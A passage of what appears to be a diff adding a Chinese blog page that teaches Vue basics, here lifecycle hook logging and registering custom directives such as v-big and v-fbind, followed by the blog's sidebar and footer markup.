class="string">&#x27;------挂载完成---------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		beforeUpdate () &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------更新前---------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">updated</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------更新后---------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144334.png" alt="  "></p>
+<hr>
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144337.png" alt="  "></p>
+<p><strong>从上面我们可以看出几点：</strong></p>
+<ul>
+<li>首次只执行了4个生命周期，<code>beforeCreate</code>，<code>created</code>, <code>beforeMount</code>, <code>mounted</code>；</li>
+<li>在第一个生命周期<code>beforeCreate</code>，拿不到data中的数据，此时数据还未初始化；</li>
+<li><code>created</code>中，可以拿到data中的message数据了，此时数据初始化已经完成</li>
+</ul>
+<h1 id="十、自定义指令"><a href="#十、自定义指令" class="headerlink" title="十、自定义指令"></a>十、自定义指令</h1><p><strong>注册一个自定义指令有全局注册与局部注册。</strong></p>
+<h2 id="1-局部注册"><a href="#1-局部注册" class="headerlink" title="1. 局部注册"></a>1. 局部注册</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;															</span><br><span class="line">	<span class="attr">directives</span>:&#123;指令名:配置对象&#125;   </span><br><span class="line">&#125;) 		</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;															</span><br><span class="line">	<span class="attr">directives</span>:&#123;指令名:回调函数&#125;   </span><br><span class="line">&#125;) 	</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试案例：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>自定义指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">	需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</span></span><br><span class="line"><span class="comment">	需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍后的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">directives</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 自定义指令</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">big</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big&#x27;</span>,<span class="variable language_">this</span>) <span class="comment">//注意此处的this是window</span></span></span><br><span class="line"><span class="language-javascript">			element.<span class="property">innerText</span> = binding.<span class="property">value</span> * <span class="number">10</span></span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">fbind</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 指令与元素成功绑定时（一上来）</span></span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">bind</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				element.<span class="property">value</span> = binding.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">inserted</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				element.<span class="title function_">focus</span>()</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 指令所在的模板被重新解析时</span></span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">update</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				element.<span class="property">value</span> = binding.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="2-全局注册"><a href="#2-全局注册" class="headerlink" title="2. 全局注册"></a>2. 全局注册</h2><p><strong>全局注册注册主要是用过<code>Vue.directive</code>方法进行注册</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;fbind&#x27;</span>,&#123;</span><br><span class="line">	<span class="comment">//指令与元素成功绑定时（一上来）</span></span><br><span class="line">	<span class="title function_">bind</span>(<span class="params">element,binding</span>)&#123;</span><br><span class="line">		element.<span class="property">value</span> = binding.<span class="property">value</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="comment">//指令所在元素被插入页面时</span></span><br><span class="line">	<span class="title function_">inserted</span>(<span class="params">element,binding</span>)&#123;</span><br><span class="line">		element.<span class="title function_">focus</span>()</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="comment">//指令所在的模板被重新解析时</span></span><br><span class="line">	<span class="title function_">update</span>(<span class="params">element,binding</span>)&#123;</span><br><span class="line">		element.<span class="property">value</span> = binding.<span class="property">value</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-钩子函数"><a href="#3-钩子函数" class="headerlink" title="3. 钩子函数"></a>3. 钩子函数</h2><p><strong>自定义指令也像组件那样存在钩子函数：</strong></p>
+<ul>
+<li><code>bind</code>：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置</li>
+<li><code>inserted</code>：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)</li>
+<li><code>update</code>：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新</li>
+<li><code>componentUpdated</code>：指令所在组件的 VNode 及其子 VNode 全部更新后调用</li>
+<li><code>unbind</code>：只调用一次，指令与元素解绑时调用</li>
+</ul>
+<p><strong>注意：</strong></p>
+<ul>
+<li><p>指令定义时不加<code>v-</code>，但使用时要加<code>v-</code></p>
+</li>
+<li><p>指令名如果是多个单词，要使用&#x3D;&#x3D;kebab-case&#x3D;&#x3D;命名方式，不要用&#x3D;&#x3D;camelCase&#x3D;&#x3D;命名</p>
+</li>
+</ul>
+
+        </article>
+        <div class="post-tools" id="post-tools">
+            <div class="post-tools-left">
+                
+                <div class="share-link mobile">
+    <div class="share-qrcode">
+        <div class="share-button" title="使用手机访问这篇文章">
+            <i class="fas fa-qrcode"></i>
+        </div>
+        <div class="share-main">
+            <div class="share-main-all">
+                <div id="qrcode" title="http://example.com/posts/d75d39a7.html">
+                </div>
+                <div class="reward-dec">使用手机访问这篇文章</div>
+            </div>
+        </div>
+        <script type="text/javascript">
+            new QRCode(document.getElementById("qrcode"), "http://example.com/posts/d75d39a7.html");
+        </script>
+    </div>
+</div>
+                <div class="share-link weibo"><a class="share-button" target="_blank"
+    href="https://service.weibo.com/share/share.php?title=Vue框架总结（一、Vue基础知识）&amp;url=http://example.com/posts/d75d39a7.html&amp;pic=https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144528.png"
+    title="分享到微博" rel="noopener external nofollow noreferrer noopener">
+    <i class="fab fa-weibo" style="font-size:22px"></i>
+</a>
+</div>
+<div class="share-link copyurl">
+<div class="share-button" id="post-share-url" title="复制链接" onclick="acrylic.copyPageUrl()">
+    <i class="fas fa-link"></i>
+</div>
+</div>
+            </div>
+            <div class="post-tools-right">
+                <div class="tag_share">
+                    <div class="post-meta__tag-list">
+                        
+                            <a href="/tags/%E5%89%8D%E7%AB%AF/" class="post-meta__tags">
+                                <span class="tags-punctuation">#</span>
+                                前端
+                                <span class="tagsPageCount">6</span>
+                            </a>
+                        
+                            <a href="/tags/vue/" class="post-meta__tags">
+                                <span class="tags-punctuation">#</span>
+                                vue
+                                <span class="tagsPageCount">5</span>
+                            </a>
+                        
+                            <a href="/tags/javascript/" class="post-meta__tags">
+                                <span class="tags-punctuation">#</span>
+                                javascript
+                                <span class="tagsPageCount">7</span>
+                            </a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="post-copyright">
+    <div class="post-copyright__author">
+        <a class="post-copyright__original" title="该文章为原创文章，注意版权协议">原创</a>
+        <a class="post-copyright-title" href="#">
+            <span>Vue框架总结（一、Vue基础知识）</span>
+        </a>
+    </div>
+    <div class="post-copyright__type">
+        <span class="post-copyright-info" id="post-copyright-url">
+            <a href="/posts/d75d39a7.html">http://example.com/posts/d75d39a7.html</a>
+        </span>
+        <button class="post-copyright-copybtn" onclick="acrylic.copyPageUrl()">
+            <i class="fas fa-paste copy-btn"></i>
+        </button>
+    </div>
+    <div class="post-copyright__notice"><span class="post-copyright-info">本文是原创文章，采用 <a
+                href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a> 协议，完整转载请注明来自 <a
+                href="/">划水艺术家</a>
+            </span>
+        </div>
+</div>
+        <nav class="pagination-post" id="pagination">
+    
+        <div class="prev-post pull-left">
+            <a href="/posts/5a112392.html">
+                <div class="pagination-info">
+                    <div class="label">上一篇</div>
+                    <div class="prev_info">浏览器本地存储</div>
+                </div>
+            </a>
+        </div>
+        <div class="next-post pull-right">
+            <a href="/posts/6abf1536.html">
+                <div class="pagination-info">
+                    <div class="label">下一篇</div>
+                    <div class="next_info">SpringBoot配置文件</div>
+                </div>
+            </a>
+        </div>
+    
+</nav>
+            
+    </div>
+    <div class="aside-content" id="aside-content">
+    
+    
+        
+        <div class="card-widget card-info">
+    <div class="card-content">
+        <div class="card-info-avatar is-center">
+            <div class="author-info__sayhi" id="author-info__sayhi">
+            </div>
+            <img class="avatar-img entered loaded" data-lazy-src="/img/acrylic.png" onerror="this.onerror=null;this.src='/img/acrylic.png'" alt="avatar" data-ll-status="loaded" src="">
+            <div class="author-info__name">
+                tangyitao
+            </div>
+            <div class="author-info__description">这有关于<b>开发</b>、<b>技术</b>相关的问题和看法。<br>相信你可以在这里找到对你有用的知识和教程。</div>
+        </div>
+    </div>
+    <div class="banner-button-group">
+        <a class="banner-button" href="/">
+            <i class="fas fa-circle-chevron-right"></i>
+            <span class="banner-button-text">个人主页</span>
+        </a>
+    </div>
+    <div class="card-info-social-icons is-center">
+        
+            <a class="social-icon" target="_blank" rel="noopener" href="https://github.com/tang-yt" title="Github">
+                <i class="fa-brands fa-github"></i>
+            </a>
+        
+            <a class="social-icon" href="mailto:tangyt2406@163.com" title="Mail">
+                <i class="fa-solid fa-envelope"></i>
+            </a>
+        
+    </div>
+</div>
+     
+    
+    <div class="sticky_layout">
+        
+            <div class="card-widget" id="card-toc">
+    <div class="item-headline">
+        <i class="fas fa-bars"></i>
+        <span>文章目录</span>
+    </div>
+    <div class="toc-content" id="toc-content">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">一、前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Vue%E7%AE%80%E4%BB%8B"><span class="toc-text">1. Vue简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Vue%E7%89%B9%E7%82%B9"><span class="toc-text">2. Vue特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Vue%E5%91%A8%E8%BE%B9%E5%BA%93"><span class="toc-text">3. Vue周边库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Vue%E5%AF%BC%E5%85%A5"><span class="toc-text">4. Vue导入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%A1%88%E4%BE%8B%E5%85%A5%E9%97%A8"><span class="toc-text">5. 案例入门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Vue%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-text">二、Vue基本语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%86%85%E5%AE%B9%E6%B8%B2%E6%9F%93%E6%8C%87%E4%BB%A4"><span class="toc-text">三、内容渲染指令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95"><span class="toc-text">1. 插值语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-v-text"><span class="toc-text">2. v-text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-v-html"><span class="toc-text">3. v-html</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-v-once"><span class="toc-text">4. v-once</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-v-pre"><span class="toc-text">5. v-pre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-v-cloak"><span class="toc-text">6. v-cloak</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E6%8C%87%E4%BB%A4"><span class="toc-text">四、数据绑定指令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-v-bind"><span class="toc-text">1. v-bind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-v-model"><span class="toc-text">2. v-model</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BB%91%E5%AE%9A%E6%96%87%E6%9C%AC%E6%A1%86"><span class="toc-text">1. 绑定文本框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%91%E5%AE%9A%E5%8D%95%E4%B8%AA%E5%A4%8D%E9%80%89%E6%A1%86"><span class="toc-text">2. 绑定单个复选框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%91%E5%AE%9A%E5%A4%9A%E4%B8%AA%E5%A4%8D%E9%80%89%E6%A1%86"><span class="toc-text">3. 绑定多个复选框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-v-model%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-text">4. v-model修饰符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93%E6%8C%87%E4%BB%A4"><span class="toc-text">五、条件渲染指令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-v-if"><span class="toc-text">1. v-if</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-v-else-if"><span class="toc-text">2. v-else-if</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-v-else"><span class="toc-text">3. v-else</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-v-show"><span class="toc-text">4. v-show</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E6%8C%87%E4%BB%A4"><span class="toc-text">六、列表渲染指令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-v-for"><span class="toc-text">1. v-for</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-key%E4%BD%9C%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="toc-text">2. key作用与原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E6%8C%87%E4%BB%A4"><span class="toc-text">七、事件监听指令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-v-on"><span class="toc-text">1. v-on</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-text">2. 事件修饰符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6"><span class="toc-text">3. 键盘事件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vue%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8C%89%E9%94%AE%E5%88%AB%E5%90%8D%EF%BC%9A-%E5%9B%9E%E8%BD%A6%EF%BC%9Aenter-%E5%88%A0%E9%99%A4%EF%BC%9Adelete-%E6%8D%95%E8%8E%B7%E2%80%9C%E5%88%A0%E9%99%A4%E2%80%9D%E5%92%8C%E2%80%9C%E9%80%80%E6%A0%BC%E2%80%9D%E9%94%AE-%E9%80%80%E5%87%BA%EF%BC%9Aesc-%E7%A9%BA%E6%A0%BC%EF%BC%9Aspace-%E6%8D%A2%E8%A1%8C%EF%BC%9Atab-%E7%89%B9%E6%AE%8A%EF%BC%8C%E5%BF%85%E9%A1%BB%E9%85%8D%E5%90%88keydown%E5%8E%BB%E4%BD%BF%E7%94%A8-%E4%B8%8A%EF%BC%9Aup-%E4%B8%8B%EF%BC%9Adown-%E5%B7%A6%EF%BC%9Aleft-%E5%8F%B3%EF%BC%9Aright"><span class="toc-text">Vue中常用的按键别名：- 回车：enter- 删除：delete (捕获“删除”和“退格”键)- 退出：esc- 空格：space- 换行：tab (特殊，必须配合keydown去使用)- 上：up- 下：down- 左：left- 右：right</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">八、过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4%E5%99%A8%E7%AE%80%E4%BB%8B"><span class="toc-text">1. 过滤器简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E5%99%A8%E6%A1%88%E4%BE%8B"><span class="toc-text">2. 过滤器案例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Vue%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">九、Vue生命周期</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4"><span class="toc-text">十、自定义指令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%B1%80%E9%83%A8%E6%B3%A8%E5%86%8C"><span class="toc-text">1. 局部注册</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%85%A8%E5%B1%80%E6%B3%A8%E5%86%8C"><span class="toc-text">2. 全局注册</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-text">3. 钩子函数</span></a></li></ol></li></ol>
+    </div>
+</div>
+            
+        
+            
+        <div class="card-widget card-recent-post">
+    <div class="item-headline">
+        <i class="fas fa-list-ol"></i>
+        <span>最近发布</span>
+    </div>
+    <div class="aside-list">
+        
+        
+            <div class="aside-list-item">
+                <a class="thumbnail" href="/posts/b873a1b0.html" title="DCL中COMMIT与ROLLBACK的使用">
+                    <img
+                        alt="DCL中COMMIT与ROLLBACK的使用"
+                        src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135307.png">
+                </a>
+                <div class="content">
+                    
+                        <a class="article-recent_post_categories" href="/posts/b873a1b0.html">
+                            技术笔记
+                        </a>
+                    
+                    <a class="title" href="/posts/b873a1b0.html" title="DCL中COMMIT与ROLLBACK的使用">
+                        DCL中COMMIT与ROLLBACK的使用
+                    </a>
+                </div>
+            </div>
+                
+        
+            <div class="aside-list-item">
+                <a class="thumbnail" href="/posts/75ee909c.html" title="SpringBoot热部署">
+                    <img
+                        alt="SpringBoot热部署"
+                        src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132418.jpeg">
+                </a>
+                <div class="content">
+                    
+                        <a class="article-recent_post_categories" href="/posts/75ee909c.html">
+                            技术笔记
+                        </a>
+                    
+                    <a class="title" href="/posts/75ee909c.html" title="SpringBoot热部署">
+                        SpringBoot热部署
+                    </a>
+                </div>
+            </div>
+                
+        
+            <div class="aside-list-item">
+                <a class="thumbnail" href="/posts/36b478da.html" title="Java经典排序">
+                    <img
+                        alt="Java经典排序"
+                        src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143240.gif">
+                </a>
+                <div class="content">
+                    
+                        <a class="article-recent_post_categories" href="/posts/36b478da.html">
+                            技术笔记
+                        </a>
+                    
+                    <a class="title" href="/posts/36b478da.html" title="Java经典排序">
+                        Java经典排序
+                    </a>
+                </div>
+            </div>
+                
+        
+            <div class="aside-list-item">
+                <a class="thumbnail" href="/posts/e3a7e431.html" title="Docker-Dockerfile">
+                    <img
+                        alt="Docker-Dockerfile"
+                        src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133723.png">
+                </a>
+                <div class="content">
+                    
+                        <a class="article-recent_post_categories" href="/posts/e3a7e431.html">
+                            技术笔记
+                        </a>
+                    
+                    <a class="title" href="/posts/e3a7e431.html" title="Docker-Dockerfile">
+                        Docker-Dockerfile
+                    </a>
+                </div>
+            </div>
+                
+        
+            <div class="aside-list-item">
+                <a class="thumbnail" href="/posts/fe26ac5e.html" title="谈谈RabbitMQ的五种消息模型以及SpringAMQP的使用">
+                    <img
+                        alt="谈谈RabbitMQ的五种消息模型以及SpringAMQP的使用"
+                        src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125552.png">
+                </a>
+                <div class="content">
+                    
+                        <a class="article-recent_post_categories" href="/posts/fe26ac5e.html">
+                            技术笔记
+                        </a>
+                    
+                    <a class="title" href="/posts/fe26ac5e.html" title="谈谈RabbitMQ的五种消息模型以及SpringAMQP的使用">
+                        谈谈RabbitMQ的五种消息模型以及SpringAMQP的使用
+                    </a>
+                </div>
+            </div>
+            
+    </div>
+</div>
+     
+        
+    </div>
+</div> 
+</main>
+                <footer id="footer">
+                    <div id="footer_deal">
+    
+        <a class="deal_link" target="_blank" href="https://github.com/tang-yt" rel="external nofollow noopener" title="Github">
